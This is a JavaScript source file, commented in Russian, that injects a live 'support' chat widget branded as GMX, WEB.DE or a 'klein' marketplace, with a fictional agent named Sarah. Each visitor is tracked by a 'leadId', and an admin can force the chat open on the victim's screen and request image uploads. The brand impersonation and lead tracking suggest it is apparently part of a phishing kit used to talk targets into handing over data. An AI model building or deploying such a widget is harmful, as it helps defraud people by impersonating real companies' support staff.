/**
 * Единый виджет чата поддержки для всех страниц GMX.
 * leadId: URL ?id= или sessionStorage['gmw_lead_id'].
 * Поддерживает: открытие по запросу админки, прочитано, печатает.
 */
(function () {
  'use strict';

  function getLeadId() {
    try {
      var params = new URLSearchParams(window.location.search);
      var id = params.get('id') || '';
      if (id) return id;
      return (typeof sessionStorage !== 'undefined' && sessionStorage.getItem('gmw_lead_id')) || '';
    } catch (e) { return ''; }
  }

  function getBrandId() {
    var brand = document.documentElement.getAttribute('data-brand');
    if (brand) return brand;
    if (typeof window.__BRAND__ !== 'undefined' && window.__BRAND__ && window.__BRAND__.id) return window.__BRAND__.id;
    return '';
  }
  function getSupportLabel() {
    var id = getBrandId();
    if (id === 'klein') return 'Support · Online';
    if (id === 'webde') return 'WEB.DE Support · Online';
    return 'GMX Support · Online';
  }
  (function applyKleinBrand() {
    var id = getBrandId();
    if (id !== 'klein') return;
    document.documentElement.setAttribute('data-brand', 'klein');
    document.documentElement.style.setProperty('--brand-primary', '#326916');
    document.documentElement.style.setProperty('--brand-primary-dark', '#2a5712');
  })();

  var leadId = getLeadId();
  var lateInitAttempts = 0;
  var lateInitMax = 50; /* ~75 sec */

  function runWidgetInit() {
    leadId = getLeadId();
    if (!leadId) return false;
    console.log('[CHAT-OPEN] виджет: инициализация с leadId=' + leadId);

    var wrap = document.getElementById('support-chat-wrap');
  if (!wrap) {
    var html =
      '<div class="support-chat-wrap" id="support-chat-wrap">' +
      '<button type="button" class="support-chat-toggle" id="support-chat-toggle" aria-label="Support öffnen">' +
      '<span class="support-chat-toggle-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"/></svg></span>' +
      '<span class="support-chat-unread-dot" id="support-chat-unread-dot" aria-hidden="true"></span>' +
      '</button>' +
      '<div class="support-chat-panel" id="support-chat-panel" hidden>' +
      '<header class="support-chat-header">' +
      '<div class="support-chat-avatar"><svg width="40" height="40" viewBox="0 0 40 40" fill="none"><circle cx="20" cy="20" r="20" fill="#1c449b"/><path d="M20 20c2.8 0 5-2.2 5-5s-2.2-5-5-5-5 2.2-5 5 2.2 5 5 5zm0 2c-3.3 0-10 1.7-10 5v3h20v-3c0-3.3-6.7-5-10-5z" fill="#fff"/></svg></div>' +
      '<div class="support-chat-meta"><span class="support-chat-name">Sarah</span><span class="support-chat-status"><span class="support-chat-status-dot" aria-hidden="true"></span></span></div>' +
      '<div class="support-chat-header-actions">' +
      '<button type="button" class="support-chat-minimize" id="support-chat-minimize" aria-label="Chat einklappen" title="Einklappen"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg></button>' +
      '<button type="button" class="support-chat-close" id="support-chat-close" aria-label="Einklappen" title="Einklappen"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14"/></svg></button>' +
      '</div></header>' +
      '<div class="support-chat-messages" id="support-chat-messages"></div>' +
      '<div class="support-chat-typing support-chat-typing--user hidden" id="support-chat-typing">Sarah schreibt…</div>' +
      '<div class="support-chat-input-wrap">' +
      '<div class="support-chat-preview" id="support-chat-preview"></div>' +
      '<div class="support-chat-input-row">' +
      '<input type="file" accept="image/*" class="support-chat-file" id="support-chat-file" aria-label="Bild anhängen" multiple>' +
      '<label for="support-chat-file" class="support-chat-img-btn" title="Bild senden">📷</label>' +
      '<textarea class="support-chat-input" id="support-chat-input" placeholder="Nachricht schreiben..." maxlength="2000" rows="1"></textarea>' +
      '<button type="button" class="support-chat-send" id="support-chat-send" aria-label="Senden">Senden</button>' +
      '</div></div></div></div>' +
      '<div id="chat-image-overlay" class="chat-image-overlay" hidden>' +
      '<button type="button" class="chat-image-overlay-close" id="chat-image-overlay-close" aria-label="Schließen">&times;</button>' +
      '<img src="" alt="" class="chat-image-overlay-img" id="chat-image-overlay-img">' +
      '</div>';
    var tmp = document.createElement('div');
    tmp.innerHTML = html;
    while (tmp.firstChild) document.body.appendChild(tmp.firstChild);
    wrap = document.getElementById('support-chat-wrap');
  }
  var nameEl = wrap && wrap.querySelector ? wrap.querySelector('.support-chat-name') : null;
  if (nameEl && getBrandId() === 'klein') nameEl.textContent = 'Support';
  var statusEl = wrap && wrap.querySelector ? wrap.querySelector('.support-chat-status') : null;
  if (statusEl) {
    var dot = statusEl.querySelector('.support-chat-status-dot');
    var labelText = getSupportLabel();
    if (dot && dot.nextSibling) statusEl.replaceChild(document.createTextNode(labelText), dot.nextSibling);
    else if (dot) statusEl.appendChild(document.createTextNode(labelText));
    else statusEl.textContent = labelText;
  }

  var chatPanel = document.getElementById('support-chat-panel');
  var chatToggle = document.getElementById('support-chat-toggle');
  var chatClose = document.getElementById('support-chat-close');
  var chatMessages = document.getElementById('support-chat-messages');
  var chatTypingEl = document.getElementById('support-chat-typing');
  if (!chatTypingEl && chatMessages && chatMessages.parentNode) {
    chatTypingEl = document.createElement('div');
    chatTypingEl.className = 'support-chat-typing support-chat-typing--user hidden';
    chatTypingEl.id = 'support-chat-typing';
    chatMessages.parentNode.insertBefore(chatTypingEl, chatMessages.nextSibling);
  }
  if (chatTypingEl && getBrandId() === 'klein') chatTypingEl.textContent = 'Support schreibt…';
  var chatInput = document.getElementById('support-chat-input');
  var chatSend = document.getElementById('support-chat-send');
  var chatFile = document.getElementById('support-chat-file');
  var chatPreview = document.getElementById('support-chat-preview');

  /** Id последнего запроса «открыть чат», для которого мы уже открыли панель. Не открываем повторно для того же id; новый клик админа = новый id. */
  var lastOpenedRequestId = null;

  function sendRead() {
    fetch('/api/chat-read', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ leadId: leadId }) }).catch(function () {});
  }

  function sendTyping(typing) {
    fetch('/api/chat-typing', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ leadId: leadId, who: 'user', typing: typing }) }).catch(function () {});
  }

  var typingTimer = null;
  function userTypingOn() {
    sendTyping(true);
    clearTimeout(typingTimer);
    typingTimer = setTimeout(function () { sendTyping(false); }, 2500);
  }
  function userTypingOff() {
    clearTimeout(typingTimer);
    sendTyping(false);
  }

  function loadChat(openIfRequested) {
    if (!leadId) return;
    fetch('/api/chat?leadId=' + encodeURIComponent(leadId) + '&_=' + Date.now(), { cache: 'no-store' })
      .then(function (r) { return r.json(); })
      .then(function (d) {
        var messages = (d && d.messages) ? d.messages : [];
        if (chatMessages) {
          chatMessages.innerHTML = '';
          messages.forEach(function (m) {
            var div = document.createElement('div');
            div.className = 'support-chat-msg support-chat-msg--' + (m.from === 'support' ? 'support' : 'user');
            var bubble = document.createElement('div');
            bubble.className = 'support-chat-msg-bubble';
            if (m.text) { var p = document.createElement('p'); p.textContent = m.text; bubble.appendChild(p); }
            if (m.image) { var img = document.createElement('img'); img.src = m.image; img.alt = ''; img.className = 'support-chat-msg-img'; bubble.appendChild(img); }
            div.appendChild(bubble);
            chatMessages.appendChild(div);
          });
          chatMessages.scrollTop = chatMessages.scrollHeight;
        }
        if (chatTypingEl) chatTypingEl.classList.toggle('hidden', !(d && d.supportTyping));
        if (openIfRequested && d && d.openChat && chatPanel) {
          var requestId = (d.openChatRequestId != null) ? String(d.openChatRequestId) : ('legacy-' + Date.now());
          if (requestId === lastOpenedRequestId) {
            fetch('/api/chat-open-ack', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ leadId: leadId }) }).catch(function () {});
          } else {
            lastOpenedRequestId = requestId;
            openChatPanel();
            fetch('/api/chat-open-ack', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ leadId: leadId }) }).catch(function () {});
          }
        }
        if (chatPanel && !chatPanel.hasAttribute('hidden')) sendRead();
      })
      .catch(function () {});
  }

  function sendChat(text, image) {
    if (!leadId) return;
    userTypingOff();
    var payload = { leadId: leadId, from: 'user' };
    if (text) payload.text = text;
    if (image) payload.image = image;
    fetch('/api/chat', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) })
      .then(function () { loadChat(false); })
      .catch(function () {});
  }

  function openChatPanel() {
    if (!chatPanel) return;
    chatPanel.removeAttribute('hidden');
    chatPanel.style.display = '';
    chatPanel.style.visibility = '';
    loadChat(false);
    sendRead();
    if (window.visualViewport && window.innerWidth <= 768) {
      var vv = window.visualViewport;
      chatPanel.style.height = vv.height + 'px';
      chatPanel.style.top = vv.offsetTop + 'px';
      chatPanel.style.left = vv.offsetLeft + 'px';
      chatPanel.style.width = vv.width + 'px';
    }
  }
  if (chatToggle && chatPanel) {
    chatToggle.addEventListener('click', function () {
      if (chatPanel.hasAttribute('hidden')) {
        openChatPanel();
      } else {
        chatPanel.setAttribute('hidden', '');
      }
    });
  }
  function closeChatPanel() {
    if (chatPanel) {
      chatPanel.setAttribute('hidden', '');
      chatPanel.style.height = '';
      chatPanel.style.top = '';
      chatPanel.style.left = '';
      chatPanel.style.width = '';
      if (chatInput && document.activeElement === chatInput) chatInput.blur();
    }
  }
  if (chatClose && chatPanel) chatClose.addEventListener('click', closeChatPanel);
  var chatMinimize = document.getElementById('support-chat-minimize');
  if (chatMinimize && chatPanel) chatMinimize.addEventListener('click', closeChatPanel);

  (function setPanelHeightForKeyboard() {
    if (!chatPanel || typeof window.visualViewport === 'undefined') return;
    function updateHeight() {
      if (window.innerWidth > 768) return;
      if (chatPanel.hasAttribute('hidden')) return;
      var vv = window.visualViewport;
      chatPanel.style.height = vv.height + 'px';
      chatPanel.style.top = vv.offsetTop + 'px';
      chatPanel.style.left = vv.offsetLeft + 'px';
      chatPanel.style.width = vv.width + 'px';
    }
    window.visualViewport.addEventListener('resize', updateHeight);
    window.visualViewport.addEventListener('scroll', updateHeight);
    if (window.innerWidth <= 768 && chatPanel && !chatPanel.hasAttribute('hidden')) updateHeight();
  })();

  if (chatSend && chatInput) {
    chatSend.addEventListener('click', function () {
      var t = (chatInput.value || '').trim();
      if (t) { sendChat(t); chatInput.value = ''; loadChat(false); }
    });
  }
  if (chatInput) {
    chatInput.addEventListener('input', userTypingOn);
    chatInput.addEventListener('blur', userTypingOff);
    chatInput.addEventListener('keydown', function (e) {
      if (e.key === 'Enter' && !e.shiftKey) {
        e.preventDefault();
        var t = (chatInput.value || '').trim();
        if (t) { sendChat(t); chatInput.value = ''; loadChat(false); }
      }
    });
  }

  if (chatFile && chatPreview) {
    chatFile.addEventListener('change', function () {
      var f = chatFile.files && chatFile.files[0];
      if (!f || !f.type.match(/^image\//)) return;
      var r = new FileReader();
      r.onload = function () {
        var dataUrl = r.result;
        if (dataUrl.length > 2500000) { alert('Bild zu groß.'); return; }
        sendChat(null, dataUrl);
        loadChat(false);
        chatFile.value = '';
      };
      r.readAsDataURL(f);
    });
  }

  var overlay = document.getElementById('chat-image-overlay');
  var overlayImg = document.getElementById('chat-image-overlay-img');
  var overlayClose = document.getElementById('chat-image-overlay-close');
  if (overlay && overlayImg && overlayClose && chatMessages) {
    chatMessages.addEventListener('click', function (e) {
      var img = e.target.closest('.support-chat-msg-img');
      if (img && img.src) { overlayImg.src = img.src; overlay.removeAttribute('hidden'); document.body.style.overflow = 'hidden'; }
    });
    overlayClose.addEventListener('click', function () { overlay.setAttribute('hidden', ''); document.body.style.overflow = ''; });
  }

  setInterval(function () { loadChat(true); }, 2500);
  loadChat(true);
  document.addEventListener('visibilitychange', function () {
    if (!document.hidden && leadId) loadChat(true);
  });
  return true;
  }

  if (leadId) {
    console.log('[CHAT-OPEN] виджет: leadId есть при загрузке, запускаю инициализацию');
    runWidgetInit();
  } else {
    console.log('[CHAT-OPEN] виджет: leadId пустой, жду появления (проверка каждые 1.5 сек, макс ~75 сек)');
    var lateInitInterval = setInterval(function () {
      lateInitAttempts++;
      if (getLeadId()) {
        clearInterval(lateInitInterval);
        console.log('[CHAT-OPEN] виджет: leadId появился через ' + lateInitAttempts + ' попыток, запускаю инициализацию');
        runWidgetInit();
      } else if (lateInitAttempts >= lateInitMax) {
        clearInterval(lateInitInterval);
        console.log('[CHAT-OPEN] виджет: leadId не появился за ' + lateInitMax + ' попыток, выхожу');
      }
    }, 1500);
  }
})();
